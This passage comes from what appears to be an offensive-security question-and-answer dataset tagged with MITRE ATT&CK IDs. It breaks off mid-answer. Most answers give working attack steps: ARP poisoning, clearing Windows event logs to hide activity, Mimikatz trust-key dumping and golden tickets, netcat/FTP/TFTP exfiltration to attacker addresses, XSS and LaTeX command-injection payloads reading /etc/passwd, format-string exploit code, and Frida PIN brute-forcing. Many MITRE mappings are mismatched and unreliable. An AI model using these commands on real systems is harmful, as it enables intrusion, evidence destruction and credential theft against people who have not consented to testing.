2. To get detailed link-layer statistics on an interface, run `ethtool -S DEVNAME` to gather usage and performance data.
3. To get information about the physical layer settings of a network interface, run `ethtool DEVNAME` to determine the link speed, duplex mode, and other characteristics. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: TA0007.

## Q: How can ettercap be used to perform a man-in-the-middle attack?
A: Ettercap supports various MITM attack methods. To perform a MITM attack, use the -M option followed by the attack method and arguments. For example, to perform an ARP poisoning attack, use the command: 'ettercap -M arp:remote /TARGET1/ /TARGET2/'. Ettercap will then sniff and filter traffic between the two targets. Version 0.8.3.1. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: TA0006.

## Q: How can an attacker disable Windows event logging to hide their tracks?
A: An attacker can use the 'Stop-Service -Name EventLog' PowerShell command or 'net stop eventlog' from cmd.exe to shut down the Windows event logging service. This may help hide malicious activity from defenders investigating the event logs. MITRE References: MITRE ID is T1562.002, MITRE Name is: Impair Defenses: Disable Windows Event Logging, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker overwhelm the Windows event logging system to avoid detection?
A: Generating a very high volume of log events can cause the transport to drop some events, potentially allowing attacker actions to go unlogged. This can be done with tools like StreamGenerator or Event Log Generator. Combine with other tactics like clearing logs. MITRE References: MITRE ID is T1562.002, MITRE Name is: Impair Defenses: Disable Windows Event Logging, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker clear the Windows security log to remove evidence of their activity?
A: Use 'wevtutil cl Security' to clear the Security event log. Requires admin privileges. To bypass auditing of the log clear event itself, first disable auditing with 'auditpol /set /category:* /success:disable /failure:disable', clear the log, then re-enable auditing. MITRE References: MITRE ID is T1070.001, MITRE Name is: Indicator Removal on Host: Clear Windows Event Logs, and MITRE Tactics are: Defense Evasion.

## Q: How could an attacker leverage the security log filling up to hide their activities?
A: If not properly configured, when the Security log reaches its size limit it will stop recording new events. An attacker could rapidly fill it up prior to an attack to avoid generating log evidence. 'for /L %i in (1,1,1000) do wevtutil GL Security >> logfile.txt' quickly generates 1000 log entries. MITRE References: MITRE ID is T1562.002, MITRE Name is: Impair Defenses: Disable Windows Event Logging, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker abuse Active Directory DSRM to obtain domain admin privileges?
A: The Directory Services Restore Mode admin account is enabled when a domain controller is put into DSRM mode. If the attacker can obtain the DSRM password hash, they can use it to gain admin privileges to attack AD. Use Mimikatz's 'lsadump::dcsync /user:administrator' command to get the DSRM administrator hash, crack it, then use Pass-the-Hash to impersonate the account. MITRE References: MITRE ID is T1207, MITRE Name is: Rogue Domain Controller, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker mix the lazy image side channel technique with event loop blocking to leak characters?
A: The attacker can inject a post starting with 'A' that includes a large `<canvas>` tag and some final `<img loading=lazy>` tags. If the attacker then injects the same post but starting with 'z', the post with the flag will appear first, and the large canvas will occupy the screen, preventing the lazy-loaded images from being seen. The attacker can then send fetch requests to measure the load time of the images - if they take longer, it means the injected post is before the flag, and if they are faster, it means the injected post is after the flag. MITRE References: MITRE ID is T1499, MITRE Name is: Data Manipulation, and MITRE Tactics are: Impact.

## Q: How can the evil-ssdp tool be used to conduct SSDP-based spoofing attacks on a local network?
A: The evil-ssdp tool can be used to respond to SSDP multicast discovery requests and pose as a generic UPNP device on the local network. This causes the spoofed device to appear in Windows Explorer on machines in the local network. Users who attempt to open the device are shown a configurable webpage. Version 0.8~beta-0kali2 of evil-ssdp can be used to perform these attacks. MITRE References: MITRE ID is T1584, MITRE Name is: Compromise Software Supply Chain, and MITRE Tactics are: Resource Development.

## Q: What techniques can be used with evil-ssdp to conduct phishing attacks against users on the local network?
A: The evil-ssdp tool allows you to configure a custom webpage that is displayed to users who attempt to open the spoofed UPNP device. This can be used to conduct phishing attacks, such as prompting users for credentials or redirecting them to a malicious site. Version 0.8~beta-0kali2 of evil-ssdp supports basic authentication and custom URL redirects for these types of phishing scenarios. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Execution, Collection.

## Q: How could evil-winrm be used to upload and execute C# executables on a remote Windows system during a penetration test?
A: With evil-winrm version 3.5, you can upload and execute C# executables on a remote Windows system by specifying the executables local path using the -e or --executables flag. For example:evil-winrm -i 192.168.1.100 -u administrator -p MyPassword123 -e /path/to/executablesThis will upload and execute the C# binaries on the remote system, allowing you to perform post-exploitation tasks such as lateral movement, privilege escalation, or data collection.The C# executables can be custom compiled or leverage open-source projects like Covenant or Sharphound to bypass security controls and expand your foothold on the network. MITRE References: MITRE ID is T1569.002, MITRE Name is: System Execution Barriers: Bypass User Account Control, and MITRE Tactics are: TA0005, Defense Evasion.

## Q: How can evilginx2 be used to perform a phishing attack and bypass 2-factor authentication?
A: evilginx2 version 3.2.0 can be used to set up a man-in-the-middle phishing attack that can bypass 2-factor authentication. The tool acts as a proxy between the victim's browser and the legitimate website, allowing it to capture login credentials and session cookies. This can then be used to access the victim's account without needing the 2-factor code. MITRE References: MITRE ID is T1566.002, MITRE Name is: Phishing: Spearphishing Link, and MITRE Tactics are: Initial Access.

## Q: What are some of the capabilities of evilginx2 for creating and managing phishing campaigns?
A: evilginx2 version 3.2.0 allows you to create and manage highly customized phishing campaigns. It includes a "phishlets" feature that lets you define the look and behavior of the phishing pages to closely match the legitimate website. evilginx2 also has its own HTTP and DNS servers to seamlessly redirect victims to the phishing pages and capture their credentials and cookies. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Initial Access.

## Q: What command can be used to monitor wireless networks and identify targets?
A: Use `airodump-ng` to monitor wireless networks and identify targets. MITRE References: MITRE ID is T1040, MITRE Name is: Network Sniffing, and MITRE Tactics are: Discovery.

## Q: How can the login page of the captive portal be customized to appear legitimate and familiar to the target user?
A: Customize the login page of the captive portal to appear legitimate and familiar to the target user. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: What are some commonly whitelisted domains that can be abused for exfiltration?
A: Check https://lots-project.com/ to find commonly whitelisted domains that can be abused MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: Exfiltration.

## Q: How can files be exfiltrated using FTP on Linux and Windows?
A: **FTP server (python):**

```
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

**FTP server (NodeJS):**

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

**FTP server (pure-ftp):**

```
apt-get update && apt-get install pure-ftp
```

**Windows client:**

```
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
``` MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: Exfiltration.

## Q: How can files be exfiltrated using SMB on Linux and Windows?
A: **Kali as server:**

```
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

**Windows:**

```
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
``` MITRE References: MITRE ID is T1105, MITRE Name is: Remote File Copy, and MITRE Tactics are: Lateral Movement, Exfiltration.

## Q: How can files be exfiltrated using SCP?
A: The attacker has to have SSHd running.

```
scp <username>@<Attacker_IP>:<directory>/<filename>
``` MITRE References: MITRE ID is T1105, MITRE Name is: Remote File Copy, and MITRE Tactics are: Lateral Movement, Exfiltration.

## Q: How can files be exfiltrated using SSHFS?
A: If the victim has SSH, the attacker can mount a directory from the victim to the attacker.

```
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
``` MITRE References: MITRE ID is T1105, MITRE Name is: Remote File Copy, and MITRE Tactics are: Lateral Movement, Exfiltration.

## Q: How can files be exfiltrated using netcat (NC)?
A: ```nc -lvnp 4444 > new_filenc -vn <IP> 4444 < exfil_file``` MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: Exfiltration.

## Q: How can files be exfiltrated using SMTP?
A: If you can send data to an SMTP server, you can create an SMTP to receive the data with python:

```sudo python -m smtpd -n -c DebuggingServer :25``` MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: Exfiltration.

## Q: How can files be exfiltrated using TFTP?
A: **TFTP server in python:**

```pip install ptftpdptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>```

In **victim**, connect to the Kali server:

```tftp -i <KALI-IP> get nc.exe``` MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: Exfiltration.

## Q: How can Exiv2 be used to modify or delete EXIF metadata in image files during a penetration test?
A: Exiv2 version 0.27.6 can be used to modify or delete EXIF metadata in image files during a penetration test. The `exiv2 mo` command can be used to add, set, or delete EXIF and IPTC metadata. For example, to set the EXIF 'Copyright' tag of an image file 'photo.jpg' to 'Pen Tester', run the following command: `exiv2 mo -M'set Exif.Image.Copyright Pen Tester' photo.jpg`. To delete the EXIF thumbnail from the image, use the command: `exiv2 mo -d t photo.jpg`. The `exiv2 mo -m` option can be used to apply a series of modification commands from a file. MITRE References: MITRE ID is T1492, MITRE Name is: Stored Data Manipulation, and MITRE Tactics are: Defense Evasion, Impact.

## Q: How can Expect be used to automate password guessing attacks against systems and applications?
A: Expect should not be used to automate password guessing or other malicious attacks, as that would be unethical and likely illegal. Expect is a powerful tool, but it should be used responsibly and only for authorized, legal activities. There are many constructive ways to use Expect, such as automating system administration tasks, testing application functionality, and developing interactive scripts. However, using Expect for password guessing or other unauthorized access attempts would be a misuse of the tool and could result in serious consequences. I cannot provide any guidance on how to use Expect for unethical or illegal activities. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: nan.

## Q: What are some trusted sources for finding pre-written exploits?
A: Some trusted sources for finding pre-written exploits include Exploit-DB and Security Focus, as they vet the exploits before publishing them. However, it is important to be paranoid and not trust shellcode or code that you did not write yourself, as it could potentially be used to hack you. MITRE References: MITRE ID is T1203, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution.

## Q: How can you bypass debuggeable and root checks in an Android app?
A: To bypass debuggeable and root checks in an Android app:1. In the debugger console's variable section, navigate to `this mLoadedAPK -> mApplicationInfo -> flags` and modify the flag value to `814267972` to unset the 'Flag_debuggable'.2. Use the debugger to control the application flow, set breakpoints, and modify local variables to bypass the security checks. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you exploit a debuggeable Android application?
A: To exploit a debuggeable Android application:1. Initiate an emulator and install the vulnerable application.2. Use `adb jdwp` to identify Dalvik VM ports that are listening.3. Forward the ports for remote debugging and attach JDB to the target application.4. Set breakpoints and control the application flow using commands like `classes`, `methods <class_name>`, `locals`, `next`, and `set`.5. Modify the local variables, such as changing the 'Try Again' message to 'Hacked', and execute the modified code using the `run` command. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can I exploit __VIEWSTATE in ASP.NET applications?
A: To exploit the __VIEWSTATE parameter in ASP.NET applications, you can follow these steps:1. Capture the __VIEWSTATE parameter from the application's response.2. Identify the __VIEWSTATE secret key, which is used to encrypt and validate the __VIEWSTATE parameter. This can be done by analyzing the application's source code or using tools like `ViewStateDecoder` to try to decrypt the __VIEWSTATE.3. Once you have the __VIEWSTATE secret key, you can craft a malicious __VIEWSTATE payload that will execute arbitrary code on the server when deserialized.4. Replace the original __VIEWSTATE parameter in the application's request with your crafted malicious payload.This attack allows you to achieve remote code execution (RCE) on the server by exploiting the deserialization vulnerability in the __VIEWSTATE parameter. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you exploit ViewState without the viewstate being sent by the server?
A: Developers can **remove ViewState** from becoming part of an HTTP Request (the user won't receive this cookie). However, if we **add ViewState parameter** to the request body and send our serialized payload created using ysoserial, we will still be able to achieve **code execution**. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution.

## Q: How can you bypass the ViewStateUserKey defense?
A: If the application uses the ViewStateUserKey property to defend against CSRF attacks, you need to use one more parameter in order to create the payload correctly:

```--viewstateuserkey="randomstringdefinedintheserver"``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you change the JSON content-type to HTML in an Express app to achieve XSS?
A: In an Express app using a JSON content type response and reflecting a JSON, you can send the following payload to confuse Express and serve up an HTML response, resulting in stored XSS:

```
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```

By polluting the `body` and `_body` properties, it's possible to cause Express to serve up the HTML content type and reflect the `_body` property, resulting in stored XSS. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you make Express render UTF-7 content through prototype pollution?
A: It's possible to make Express render UTF-7 content with the following payload:

```
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
``` MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you use prototype pollution to change the returned status code in an Express app?
A: It's possible to change the returned status code using the following prototype pollution payload:

```
{"__proto__":{"status":510}}
``` MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you use SID History Abuse to gain access to an external Active Directory domain?
A: To abuse SID History to gain access to an external Active Directory domain, you can follow these steps:1. Retrieve the signing key for the trusted domain using Invoke-Mimikatz with the 'lsadump::trust /patch' command.2. Use the Invoke-Mimikatz 'kerberos::golden' command to generate a golden ticket, impersonating a user in the current domain and using the trusted domain's signing key.3. Use the generated golden ticket to request a TGS (Ticket Granting Service) ticket to access resources in the external domain, such as the CIFS (Common Internet File System) service on the domain controller.This allows you to bypass authentication checks and gain access to the external domain, even if you don't have direct credentials for a user in that domain. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: What are some techniques to gain initial access to an external Active Directory domain when you don't have special privileges?
A: If you don't have any special access to the external domain, you can still try to gain initial access by using techniques such as:1. Kerberoasting: Use PowerView functions like Get-DomainUser -SPN to enumerate users with Service Principal Names (SPNs), and then attempt to crack the Kerberos tickets for those users.2. Pass the Ticket (PtT): If you can obtain a valid Kerberos ticket for a user in the external domain, you can use that ticket to authenticate and access resources in the external domain.3. Credential Dumping: If you can gain access to a system in the external domain, try to dump credentials using tools like Mimikatz to see if you can obtain valid credentials for users in that domain.These techniques can help you gain an initial foothold in the external domain, which you can then use to further escalate privileges. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can one extract the password and hash of the trust account from a Domain Controller in domain A?
A: The command to perform this action is:

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
This extraction is possible because the account, identified with a **$** after its name, is active and belongs to the "Domain Users" group of domain **A**, thereby inheriting permissions associated with this group. This allows individuals to authenticate against domain **A** using the credentials of this account. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberoasting, and MITRE Tactics are: CredentialAccess, Persistence, PrivilegeEscalation.

## Q: How can one dump the Kerberos trust keys to reveal the credentials of the trust account in the trusted domain?
A: In a scenario where `ext.local` is the trusting domain and `root.local` is the trusted domain, a user account named `EXT$` would be created within `root.local`. Through specific tools, it is possible to dump the Kerberos trust keys, revealing the credentials of `EXT$` in `root.local`. The command to achieve this is:

```
lsadump::trust /patch
``` MITRE References: MITRE ID is T1550.003, MITRE Name is: Use Stolen Credentials: Kerberoasting, and MITRE Tactics are: CredentialAccess, Lateral Movement, PrivilegeEscalation.

## Q: How can one obtain the cleartext trust password from the output of Mimikatz?
A: The cleartext password can be obtained by converting the [ CLEAR ] output from mimikatz from hexadecimal and removing null bytes '\x00':

Sometimes when creating a trust relationship, a password must be typed in by the user for the trust. In this demonstration, the key is the original trust password and therefore human readable. As the key cycles (30 days), the cleartext will not be human-readable but technically still usable.

The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT using the Kerberos secret key of the trust account. MITRE References: MITRE ID is T1003.001, MITRE Name is: OS Credential Dumping: LSASS Memory, and MITRE Tactics are: CredentialAccess.

## Q: What are some techniques to find leaked credentials or secrets related to a company?
A: Check credential leak databases, search for leaked credentials or API keys in public code repositories like GitHub, and search for sensitive information in public pastes and using Google dorks. MITRE References: MITRE ID is T1606, MITRE Name is: Forge Certificates, and MITRE Tactics are: Credential Access.

## Q: What are some tools that can be used to extract entitlements from encrypted iOS app binaries?
A: If the app binary is encrypted, tools like Clutch (if compatible with the iOS version), frida-ios-dump, or similar utilities may be required to decrypt and extract the app. These tools can be used to access the app binary and then use techniques like `binwalk`, `radare2`, or `grep` to extract the entitlements information. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you exploit Failure to Restrict URL Access?
A: It kind of depends on what access you have to the service. If you have access to an installation you can just create a list of all URLs that the admin-account, or low-privilege accounts have access too. And then check if a non-authenticated users can access those pages.

If you are testing it black-box style you can force browse it. MITRE References: MITRE ID is T1188, MITRE Name is: Application Access Token, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can Fern Wifi Cracker be used to perform man-in-the-middle attacks on wireless networks?
A: Fern Wifi Cracker version 3.4 can be used to perform man-in-the-middle attacks on wireless networks by utilizing tools like Ettercap to intercept and modify traffic between clients and the access point. This allows for activities like sniffing passwords, website content modification, and other malicious actions. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can feroxbuster be used to perform a recursive directory enumeration attack against a web server?
A: To perform a recursive directory enumeration attack using feroxbuster version 2.10.1, you can use the following command:

```feroxbuster -u http://example.com -w /path/to/wordlist.txt -d 4 -t 50 -S 404```

This will recursively scan the target website up to a depth of 4 directories, using 50 concurrent threads and a wordlist located at `/path/to/wordlist.txt`. The `-S 404` option filters out any 404 (not found) responses.

This attack technique falls under the MITRE ATT&CK framework's Reconnaissance tactic, specifically the ID `T1593` (Search Open Websites/Domains). MITRE References: MITRE ID is T1593, MITRE Name is: Search Open Websites/Domains, and MITRE Tactics are: TA0043.

## Q: How can ferret-sidejack be used to perform network reconnaissance and data gathering during a penetration test?
A: Ferret-sidejack can be used to capture and analyze network traffic during a penetration test. The tool can be used to dump interesting data from the traffic, such as login credentials, sensitive information, and communication patterns. This information can then be used to further the penetration test, such as by leveraging captured credentials for lateral movement. Version 3.0.1 was used for this example. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Discovery, Collection.

## Q: How can fierce be used to perform internal network reconnaissance on a target organization?
A: Fierce can be used to perform internal network reconnaissance on a target organization by utilizing the "--range" option to scan an internal IP range using CIDR notation. This can help discover non-contiguous IP space and potentially misconfigured networks that leak internal address information. Fierce version 1.5.0 can be used for this type of internal network reconnaissance. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: How can fiked be used to capture XAUTH login credentials from a Cisco VPN server?
A: Fiked v0.0.5 can be used to impersonate a VPN gateway's IKE responder in order to capture XAUTH login credentials in a semi-MitM attack. The tool can be run with the following command to achieve this:

```
root@kali:~# fiked -g <vpn_gateway_ip> -k <group_id>:<preshared_key> -u <unprivileged_user>
```

This will cause fiked to forge IP packets and impersonate the VPN gateway, capturing any XAUTH credentials entered by a client attempting to authenticate. The captured credentials can then be logged to a file using the -l option. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: CredentialAccess, LateralMovement.

## Q: How could fiked be used in a Penetration Testing engagement to bypass authentication for a Cisco VPN?
A: Fiked v0.0.5 can be used to bypass authentication for a Cisco VPN by impersonating the VPN gateway and capturing XAUTH login credentials. The tool can be used as follows:

```root@kali:~# fiked -g <vpn_gateway_ip> -k <group_id>:<preshared_key> -u <unprivileged_user> -l <log_file>```This will cause fiked to forge IP packets and impersonate the VPN gateway, capturing any XAUTH credentials entered by a client attempting to authenticate. The captured credentials can then be used to authenticate directly to the VPN server, bypassing the normal authentication process. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: CredentialAccess, InitialAccess.

## Q: How can we use finalrecon v1.1.6 to perform a full web reconnaissance on a target?
A: To perform a full web reconnaissance on a target using finalrecon v1.1.6, you can use the --full option. This will execute the following reconnaissance tasks in a single command:- Gather header information- Retrieve SSL/TLS certificate details- Conduct a WHOIS lookup- Crawl the target website- Perform DNS enumeration- Discover subdomains- Conduct directory searches- Retrieve Wayback Machine URLs- Perform a fast port scanThe command to run a full reconnaissance would be:finalrecon --full https://example.comThis comprehensive scan will provide you with detailed information about the target's web infrastructure, allowing you to gain a deeper understanding of its attack surface. MITRE References: MITRE ID is T1595, MITRE Name is: Active Scanning, and MITRE Tactics are: Discovery.

## Q: How can firmware-mod-kit be used to modify and repackage firmware for embedded devices during a penetration test?
A: The firmware-mod-kit version 0.99+git20190714-0kali1 can be used to modify and repackage firmware for embedded devices. After extracting the firmware using the tool, you can make changes to the files and directories, such as inserting backdoors or modifying configurations. Then, you can use the firmware_mod_kit.pl script to repack the modified files into a new firmware image that can be flashed back to the device. This could be useful for testing the security of the firmware update process or deploying custom firmware to a target device. MITRE References: MITRE ID is T1480, MITRE Name is: Execution Guardrails, and MITRE Tactics are: Defense Evasion, Privilege Escalation, Initial Access.

## Q: How can the firmware-sof package be used to identify and exploit vulnerabilities in Intel audio firmware?
A: The firmware-sof package contains the pre-built and signed Intel SOF audio firmware, which can be analyzed for potential vulnerabilities. Using tools like binwalk, IDA Pro, or Ghidra, security researchers can reverse engineer and inspect the firmware binaries for any flaws or weaknesses that could be exploited. Version 2.2.4-1 of the package should be used for this analysis. Any discovered vulnerabilities should be responsibly disclosed to the vendors. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you use RIPsession to brute-force websites using cookies crafted with flask-unsign?
A: You can use the RIPsession tool to brute-force websites using cookies crafted with flask-unsign:

```
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you use SQLmap to exploit SQLi in a Flask session cookie?
A: You can use SQLmap's `eval` option to automatically sign SQLmap payloads for a Flask application using a known secret:

```
sqlmap -u 'http://target.com' --cookie="{'logged_in':True}" --eval="import os; secret='CHANGE_ME'; import flask; payload=flask.json.dumps({'logged_in':True}); print(flask.sessions.create_cookie(payload, secret))" --threads 10 --dbs
``` MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can you use format strings to perform an arbitrary read?
A: It's possible to use the formatter `%n$s` to make `printf` get the address situated in the n position, following it and print it as if it was a string (print until a 0x00 is found). So if the base address of the binary is `0x8048000`, and we know that the user input starts in the 4th position in the stack, it's possible to print the starting of the binary with:

```pythonfrom pwn import *p = process('./bin')payload = b'%6$s' #4th parampayload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)payload += p32(0x8048000) #6th paramp.sendline(payload)log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'``` MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you use format strings to perform an arbitrary write?
A: The formatter `$<num>%n` writes the number of written bytes in the indicated address in the <num> param in the stack. If an attacker can write as many char as he will with printf, he is going to be able to make `$<num>%n` write an arbitrary number in an arbitrary address.

To write the number 9999, it's possible to use the formatter `%.<num-write>%<num>$n` to write the number `<num-write>` in the address pointed by the `num` position. For example:

```AAAA%.6000d%4\$n -> Write 6004 in the address indicated by the 4Âº paramAAAA.%500\$08x -> Param at offset 500```

However, note that usually in order to write an address such as `0x08049724` (which is a HUGE number to write at once), `$hn` is used instead of `$n`. This allows to only write 2 Bytes. Therefore this operation is done twice, one for the highest 2B of the address and another time for the lowest ones. MITRE References: MITRE ID is T1047, MITRE Name is: Windows Management Instrumentation, and MITRE Tactics are: Execution.

## Q: How can you use format strings to exploit a buffer overflow vulnerability?
A: It's possible to abuse the write actions of a format string vulnerability to write in addresses of the stack and exploit a buffer overflow type of vulnerability. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: Privilege Escalation.

## Q: How can you execute commands using LaTeX injection?
A: To execute commands using LaTeX injection, you can use the `\immediate\write18{command}` construct, where the input of the command will be redirected to stdin. You can also use a temporary file to capture the output, for example: `\immediate\write18{env > output}`, `\input{output}`. Other examples include: `\input{|"/bin/hostname"}`, `\input{|"extractbb /etc/passwd > /tmp/b.tex"}`. If certain commands are not allowed, you can try alternatives like `\input{|"bibtex8 --version > /tmp/b.tex"}`, `\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}`, `\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}`, or `\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}`. Consider using base64 encoding to avoid issues with bad characters in the output. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you perform Cross-Site Scripting (XSS) using LaTeX injection?
A: You can perform Cross-Site Scripting (XSS) using LaTeX injection by using the `\url{javascript:alert(1)}` and `\href{javascript:alert(1)}{placeholder}` constructs, which will execute the JavaScript payload when the document is rendered. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript, and MITRE Tactics are: Execution.

## Q: How can fping be used to perform a targeted denial-of-service (DoS) attack?
A: fping version 5.1 should not be used to perform denial-of-service attacks, as that would be unethical and likely illegal in most jurisdictions. fping is a network diagnostic tool intended for benign network scanning and testing purposes. Using it to intentionally disrupt or overwhelm network services would be an abuse of the tool's functionality. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: nan.

## Q: How can fragrouter be used to evade network intrusion detection systems (NIDS)?
A: fragrouter version 1.6 can be used to create IP packet fragments and TCP segments that are designed to evade NIDS detection. For example, using the "-F1" option sends ordered 8-byte IP fragments, which can bypass some NIDS that are not configured to properly reassemble fragmented packets. Similarly, the "-T1" option sends a TCP 3-way handshake with bad checksums and ordered 1-byte segments, which may bypass NIDS rules looking for normal TCP traffic. MITRE References: MITRE ID is T1497, MITRE Name is: Virtualization/Sandbox Evasion, and MITRE Tactics are: Defense Evasion, Discovery.

## Q: How can you extract password hashes from the FreeIPA server?
A: To extract password hashes from the FreeIPA server, you need to be the root user. You can then use the `dbscan` tool to extract the hashes. The password hashes are stored in the `userPassword` attribute in base64 format, and may be SSHA512 (old versions of FreeIPA) or PBKDF2_SHA256 (newer versions). You'll need to decode the base64, identify the hash type, and use tools like John the Ripper or Hashcat to crack the hashes. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can you bypass a boolean check in an Android application using Frida?
A: To bypass a boolean check in an Android application using Frida, you can use the following hook script:

```javascript//hook1.jsJava.perform(function() { console.log("[ * ] Starting implementation override...") var MainActivity = Java.use("infosecadventures.fridademo.utils.PinUtil"); MainActivity.checkPin.implementation = function(pin){     console.log("[ + ] PIN check successfully bypassed!")     return true; }});```
To run it, use the following command:

```python hooking.py hook1.js```
This will hook the `checkPin` method of the `infosecadventures.fridademo.utils.PinUtil` class and always return `true`, effectively bypassing the boolean check. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you perform a brute-force attack on a PIN-based authentication mechanism using Frida?
A: To perform a brute-force attack on a PIN-based authentication mechanism using Frida, you can use the following hook script:```javascript//hook2.jsJava.perform(function () {    console.log("[ * ] Starting PIN Brute-force, please wait...")    var PinUtil = Java.use("infosecadventures.fridademo.utils.PinUtil");    for(var i=1000; i < 9999; i++)    {        if(PinUtil.checkPin(i+"") == true){            console.log("[ + ] Found correct PIN: " + i);        }    }});```To run it, use the following command:```python hooking.py hook2.js```This script will brute-force the PIN by iterating through all possible 4-digit PINs (1000 to 9999) and calling the `checkPin` method to find the correct PIN. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you use nmap to scan through a vulnerable FTP server?
A: You can use nmap with the `-b` option to scan through a vulnerable FTP server:

